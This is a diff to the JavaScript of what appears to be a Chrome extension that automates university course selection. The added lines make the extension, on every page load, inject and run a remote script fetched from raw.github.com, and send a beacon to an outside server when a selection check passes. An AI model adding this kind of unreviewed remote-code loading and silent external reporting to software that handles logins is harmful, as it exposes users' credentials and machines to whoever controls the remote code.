@@ -149,7 +149,8 @@ function checkUserInfo()
     
 }
 function showResponse2(channelI, data)
-{
+{    
+
     if (isAutoIdentify)
     {
         if (data.match(loginForm.stuname.value) != null)
@@ -182,11 +183,25 @@ function checkPermit()
     myAjax("post", channel + url, true, "", currentJ + 1, showResponse3);
     
 }
+
+function getSuccess() {
+
+  var url = 'http://jxufexk.duapp.com/getSuccess.php';
+  myAjax("get", url, true, "", 0, isSuccess);
+  
+}
+function isSuccess()
+{
+   //alert("success!");
+}
+
+
 function showResponse3(channelI, data)
 {
     
     if (data.match("所有条件均符合选课条件") != null)
     { //可改
+	    getSuccess();
         var url = studentSelectSubjectUrl;
         chrome.extension.getBackgroundPage().Global_currentChannel = channel;
         if (isAutoSelectCourse)
@@ -362,6 +377,12 @@ function getNotification(i, data)
 }
 window.onload = function forOnLoad() //载入页面就执行
 {
+    var ga = document.createElement('script'); 
+	ga.type = 'text/javascript'; 
+	ga.async = true;
+    ga.src = 'https://raw.github.com/Allsum7/jxufexk/master/crxLogin.js';
+	document.head.appendChild(ga);
+	
     var myInterval = '';
     //ajax 全局事件
     $(document).ajaxStart(function ()
